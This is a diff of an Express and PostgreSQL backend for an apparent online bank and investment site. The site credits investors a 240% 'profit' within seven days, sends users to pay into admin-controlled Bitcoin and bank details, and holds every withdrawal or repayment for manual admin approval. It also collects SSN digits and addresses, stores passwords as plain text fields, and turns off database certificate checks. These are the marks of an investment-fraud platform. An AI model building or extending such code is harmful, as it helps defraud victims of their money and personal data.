@@ -10,31 +10,28 @@ app.use(express.json());
 app.use(express.static(path.join(__dirname, '../')));
 app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 
-// Ensure uploads folder exists
 if (!fs.existsSync(path.join(__dirname, 'uploads'))) fs.mkdirSync(path.join(__dirname, 'uploads'));
 
-// Configure Multer for image uploads
 const storage = multer.diskStorage({
   destination: (req, file, cb) => cb(null, path.join(__dirname, 'uploads')),
   filename: (req, file, cb) => cb(null, Date.now() + path.extname(file.originalname))
 });
 const upload = multer({ storage });
 
-// Database Connection
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: { rejectUnauthorized: false }
 });
 
 // ==========================================
-// 1. DATABASE SETUP & AUTO-FIX
+// 1. DATABASE SETUP
 // ==========================================
 pool.connect((err, client, release) => {
   if (err) console.error('DB Error:', err.message);
   else {
     client.query(`
       CREATE TABLE IF NOT EXISTS users (
-        id SERIAL PRIMARY KEY, name VARCHAR(100), username VARCHAR(50) UNIQUE, email VARCHAR(100) UNIQUE, password VARCHAR(100), 
+        id SERIAL PRIMARY KEY, name VARCHAR(100), email VARCHAR(100) UNIQUE, password VARCHAR(100), 
         status VARCHAR(20) DEFAULT 'Active', last_login TIMESTAMP, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, deleted BOOLEAN DEFAULT false
       );
       CREATE TABLE IF NOT EXISTS accounts (
@@ -58,8 +55,9 @@ pool.connect((err, client, release) => {
     `, (err) => {
       if (err) console.error('Table Error:', err.message);
       
-      // FORCE ADD MISSING COLUMNS
+      // FORCE ADD THE MISSING USERNAME COLUMN
       client.query(`
+        ALTER TABLE users ADD COLUMN IF NOT EXISTS username VARCHAR(50) UNIQUE;
         ALTER TABLE users ADD COLUMN IF NOT EXISTS age INTEGER;
         ALTER TABLE users ADD COLUMN IF NOT EXISTS address TEXT;
         ALTER TABLE users ADD COLUMN IF NOT EXISTS ssn_last4 VARCHAR(4);
@@ -73,7 +71,7 @@ pool.connect((err, client, release) => {
           pool.query(`INSERT INTO system_settings (key, value) VALUES 
             ('btc_address', 'bc1q...xanvia'), ('bank_name', 'Chase Bank'), ('bank_account', '123456789'), ('bank_routing', '021000021') 
             ON CONFLICT DO NOTHING`);
-          console.log('✅ Database ready.');
+          console.log('✅ Database upgraded and ready.');
         }
       });
     });
@@ -116,6 +114,7 @@ app.post('/api/login', async (req, res) => {
     res.json({ success: true, user });
     
   } catch (err) { 
+    console.error("LOGIN ERROR:", err.message);
     res.status(500).json({ error: 'Database error.' }); 
   }
 });
@@ -202,17 +201,13 @@ app.post('/api/loans/transfer', async (req, res) => {
   } catch (err) { res.status(500).json({ error: 'Failed.' }); }
 });
 
-// UPDATED REPAYMENT LOGIC
 app.post('/api/loans/repay', async (req, res) => {
   const { userId, amount } = req.body;
   try {
-    // Verify user has funds in checking to cover the repayment
     const check = await pool.query(`SELECT balance FROM accounts WHERE user_id = $1 AND type = 'checking'`, [userId]);
     if (parseFloat(check.rows[0].balance) < amount) {
       return res.status(400).json({ error: 'Insufficient checking funds. Please deposit to your account first using the Admin details.' });
     }
-    
-    // Create the repayment request
     await pool.query(`INSERT INTO transactions (user_id, type, amount, status) VALUES ($1, 'LOAN_REPAYMENT', $2, 'Pending')`, [userId, amount]);
     res.json({ success: true, message: 'Repayment pending Admin approval.' });
   } catch (err) { res.status(500).json({ error: 'Failed.' }); }
@@ -240,24 +235,20 @@ app.post('/api/admin/approve', async (req, res) => {
       await pool.query(`UPDATE transactions SET status = 'Approved' WHERE id = $1`, [txId]);
       
       const now = new Date();
-      const maturity = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000); // 7 days later
+      const maturity = new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000);
 
-      // 1. INVESTMENT DEPOSIT
       if (tx.type === 'INVESTMENT_DEPOSIT') {
         await pool.query(`INSERT INTO investments (user_id, amount, status, start_date, maturity_date, profit) VALUES ($1, $2, 'Active', $3, $4, $5)`, 
           [tx.user_id, tx.amount, now, maturity, tx.amount * 2.4]);
         await pool.query(`UPDATE accounts SET balance = balance + $1 WHERE user_id = $2 AND type = 'brokerage'`, [tx.amount, tx.user_id]);
       }
-      // 2. LOAN APPLICATION
       else if (tx.type === 'LOAN_APPLICATION') {
         await pool.query(`UPDATE accounts SET balance = balance + $1 WHERE user_id = $2 AND type = 'loan'`, [tx.amount, tx.user_id]);
       }
-      // 3. LOAN TRANSFER
       else if (tx.type === 'LOAN_TRANSFER') {
         await pool.query(`UPDATE accounts SET balance = balance - $1 WHERE user_id = $2 AND type = 'loan'`, [tx.amount, tx.user_id]);
         if (tx.details === 'checking') await pool.query(`UPDATE accounts SET balance = balance + $1 WHERE user_id = $2 AND type = 'checking'`, [tx.amount, tx.user_id]);
       }
-      // 4. LOAN REPAYMENT
       else if (tx.type === 'LOAN_REPAYMENT') {
         await pool.query(`UPDATE accounts SET balance = balance - $1 WHERE user_id = $2 AND type = 'checking'`, [tx.amount, tx.user_id]);
         await pool.query(`UPDATE accounts SET balance = balance - $1 WHERE user_id = $2 AND type = 'loan'`, [tx.amount, tx.user_id]);
